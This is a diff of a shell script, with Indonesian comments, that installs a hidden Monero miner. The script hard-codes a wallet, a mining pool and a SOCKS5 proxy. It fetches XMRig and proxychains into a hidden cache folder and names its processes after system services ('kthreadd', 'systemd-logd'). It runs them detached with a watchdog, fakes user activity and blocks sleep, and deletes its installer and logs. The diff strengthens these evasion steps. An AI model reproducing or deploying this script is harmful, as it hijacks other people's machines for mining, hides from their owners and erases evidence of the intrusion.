@@ -6,18 +6,13 @@ WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrx
 POOL="24.199.99.228:1935"
 SOCKS5_IP="116.100.220.220"
 SOCKS5_PORT="1080"
-if command -v hostname >/dev/null 2>&1; then
-  WORKER="kthreadd-$(hostname)"
-else
-  WORKER="kthreadd-$(date +%s)"
-fi
+WORKER="kthreadd-$(hostname 2>/dev/null || date +%s)"
 DIR="$HOME/.cache/.kthreadd"
 
-# === PERSIAPAN ===
 mkdir -p "$DIR" && cd "$DIR"
 sync || true
 
-# === DOWNLOAD XMRIG ===
+# === DOWNLOAD XMRIG STEALTH ===
 XMRIG_URL=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep browser_download_url | grep linux-static-x64.tar.gz | cut -d '"' -f 4)
 curl -sLo xmrig.tar.gz "$XMRIG_URL"
 tar -xzf xmrig.tar.gz --strip-components=1
@@ -30,7 +25,7 @@ curl -sLo proxychains https://raw.githubusercontent.com/sagemantap/xmrig-antiban
 curl -sLo libproxychains.so.4 https://raw.githubusercontent.com/sagemantap/xmrig-antiban/main/libproxychains.so.4
 chmod +x proxychains libproxychains.so.4
 
-# === KONFIGURASI PROXY ===
+# === PROXY CONFIG ===
 cat > proxychains.conf <<EOF
 strict_chain
 proxy_dns
@@ -41,7 +36,7 @@ tcp_connect_time_out 8000
 socks5 $SOCKS5_IP $SOCKS5_PORT
 EOF
 
-# === KONFIGURASI XMRIG ===
+# === XMRIG CONFIG ===
 cat > config.json <<EOF
 {
   "autosave": true,
@@ -80,7 +75,7 @@ EOF
 javac Launcher.java
 jar cfe systemd-logd.jar Launcher Launcher.class
 
-# === JALANKAN JAVA MINER STEALTH ===
+# === JALANKAN STEALTH MINER ===
 nohup java -Djna.nosys=true -Djava.awt.headless=true -jar systemd-logd.jar >/dev/null 2>&1 &
 disown
 
@@ -101,16 +96,22 @@ chmod +x watchdog.sh
 nohup bash watchdog.sh >/dev/null 2>&1 &
 disown
 
-# === ANTI SUSPEND / DISMISS ===
+# === ANTI SUSPEND KUAT (hybrid) ===
 cat > antisuspend.sh <<EOF
 #!/bin/bash
 while true; do
-  if [ -e /dev/input/mice ]; then
-    dd if=/dev/zero of=/dev/input/mice bs=1 count=1 2>/dev/null
-  fi
-  xset s reset >/dev/null 2>&1 || true
-  gdbus call --session --dest org.freedesktop.ScreenSaver --object-path /org/freedesktop/ScreenSaver \\
+  gdbus call --session --dest org.freedesktop.ScreenSaver \\
+    --object-path /org/freedesktop/ScreenSaver \\
     --method org.freedesktop.ScreenSaver.SimulateUserActivity >/dev/null 2>&1 || true
+
+  xset s reset >/dev/null 2>&1 || true
+
+  if [ -e /dev/uinput ]; then
+    echo "Simulating input" > /dev/uinput 2>/dev/null || true
+  fi
+
+  systemd-inhibit --what=idle:sleep --who="miner" --why="prevent sleep" sleep 0.5 || true
+
   sleep 30
 done
 EOF
@@ -127,7 +128,7 @@ disown
   echo "[✓] Installer dan konfigurasi dibersihkan otomatis."
 ) &
 
-# === AUTO HAPUS LOG ===
+# === AUTO BERSIHKAN LOG MINING ===
 (
   while true; do
     rm -f "$HOME"/nohup.out "$DIR"/*.log 2>/dev/null
@@ -135,4 +136,4 @@ disown
   done
 ) &
 
-echo "[✓] Miner stealth + watchdog + anti suspend aktif."
+echo "[✓] Stealth miner aktif dengan watchdog dan anti suspend kuat."
